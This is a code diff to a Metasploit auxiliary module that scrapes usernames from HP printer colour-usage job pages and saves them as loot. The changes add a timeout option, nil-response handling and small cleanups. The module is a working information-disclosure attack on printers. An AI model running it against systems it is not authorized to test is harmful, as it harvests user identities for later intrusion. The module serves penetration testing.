@@ -21,7 +21,7 @@ class Metasploit3 < Msf::Auxiliary
       'Author'         =>
         [
           'Deral "Percentx" Heiland',
-          'Pete'
+          'Pete "Bokojan" Arzamendi'
         ],
       'License'        => MSF_LICENSE
     ))
@@ -29,15 +29,20 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", false]),
-        OptInt.new('RPORT', [ true, "The target port", 80])
+        OptInt.new('RPORT', [ true, "The target port", 80]),
+        OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20])
       ], self.class)
   end
 
   def run_host(ip)
     @uri_page = "/hp/device/this.LCDispatcher?nav=hp.ColorUsage"
     print_status("Attempting to enumerate usernames from: #{rhost}")
-    jobs = get_number_of_jobs(rhost) 
+    jobs = get_number_of_jobs(rhost)
+    return if jobs.nil?
+
     users = get_usernames(jobs)
+    return if users.nil?
+    
     usernames = ""
     
     unless users.blank?
@@ -54,8 +59,6 @@ class Metasploit3 < Msf::Auxiliary
       p = store_loot(loot_name, loot_type, datastore['RHOST'], usernames , loot_filename, loot_desc)
       print_status("Credentials saved in: #{p.to_s}")
     end
-
-
   end
 
   def get_number_of_jobs(rhost)
@@ -64,16 +67,21 @@ class Metasploit3 < Msf::Auxiliary
         {
           'uri'       => @uri_page,
           'method'    => 'GET'
-        })
+        }, datastore['TIMEOUT'].to_i)
       rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
       print_error("#{rhost}:#{rport} - Connection failed.")
       return :abort
     end
     
-      html_body = ::Nokogiri::HTML(res.body) 
+     if res == nil
+        print_error("#{rhost}:#{rport} - Connection failed.")
+        return
+      end
+
+      html_body = ::Nokogiri::HTML(res.body)
       data_to_parse_for_jobs = html_body.xpath('/html/body/div/table/tr/td/div/div/div/table/tr/td/div/div')
       
-      #check to see if the number of jobs is empty. If so return zero my friend.  
+      #check to see if the number of jobs is empty. If so return zero my friend.
       unless data_to_parse_for_jobs.empty?
         number_of_jobs = data_to_parse_for_jobs[2].text.scan(/of\s(\d*?)\)/)
         return number_of_jobs[0]
@@ -86,17 +94,22 @@ class Metasploit3 < Msf::Auxiliary
   def get_usernames(jobs)
     pages = jobs[0].to_i
     usernames = []
-    while pages >= 0 do 
+    while pages >= 0 do
       user_record_page = "#{@uri_page}&startRecord=#{pages}"
-  	  begin
+      begin
         res = send_request_cgi(
           {
             'uri'       => user_record_page,
             'method'    => 'GET'
-          })
-  	  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-    	  print_error("#{rhost}:#{rport} - Connection failed.")
-    	  return :abort
+          }, datastore['TIMEOUT'].to_i)
+      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
+        print_error("#{rhost}:#{rport} - Connection failed.")
+        return
+      end
+
+       if res == nil
+        print_error("#{rhost}:#{rport} - Connection failed.")
+        return
       end
 
       html_body = ::Nokogiri::HTML(res.body)
@@ -108,7 +121,7 @@ class Metasploit3 < Msf::Auxiliary
           usernames << line.content.strip
         end
       end
-      pages -= 100  
+      pages -= 100 
     end
     return usernames.uniq!
   end
